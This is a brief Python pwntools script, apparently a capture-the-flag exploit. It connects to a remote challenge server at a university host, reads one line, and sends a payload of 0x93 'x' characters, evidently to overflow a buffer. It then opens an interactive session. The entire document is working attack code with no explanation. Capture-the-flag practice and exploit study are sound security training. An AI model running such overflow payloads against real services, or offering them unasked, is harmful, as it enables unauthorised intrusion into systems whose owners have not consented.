from pwn import *

s =  remote('mustard.stt.rnl.tecnico.ulisboa.pt', 23151)

print(s.recvline())

s.sendline("x"*0x93)

s.interactive()
